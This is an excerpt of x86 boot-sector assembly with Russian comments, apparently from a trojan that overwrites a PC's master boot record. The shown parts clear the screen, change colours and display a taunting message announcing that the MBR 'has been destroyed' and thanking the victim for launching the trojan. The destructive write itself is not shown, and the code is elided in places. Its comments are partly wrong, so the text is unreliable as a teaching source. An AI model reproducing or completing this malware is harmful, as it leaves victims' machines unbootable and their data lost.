...
start:								;Метка start
	cmp bh, 0xFF						;Сравниваем значение в bh с 0xFF
	je @IfBhEqualsF						;Если bh равно 0xFF, то переходим к метке @IfBhEqualsF
	jmp @IfBhNotEqualsF					;Если не равно, то пропускаем всё под меткой @IfBhEqualsF
@IfBhEqualsF:
	mov bh, 0x00						;Изменяем цвет фона и текста на 0
        call clear_screen					;Вызываем clear_screen
...
clear_screen:							;Метка clear_screen 				;ax = 0x0700 - функция для прокрутки окна			
        ...
        mov al, 0x00						;Загружаем в регистр al ничего									
...
msg:            db        "Your MBR has been destroyed :D",13,10,"Enjoy This beautiful text and colorful background) ",13,10,"Thanks for launnched this trojan.",13,10,"Good Luck ;)  : )  :3",0					;Кладём в переменную msg битвую строку					(P.s. db = default bits, ...,13,10,... - перенос каретки и переход на следующую строку)
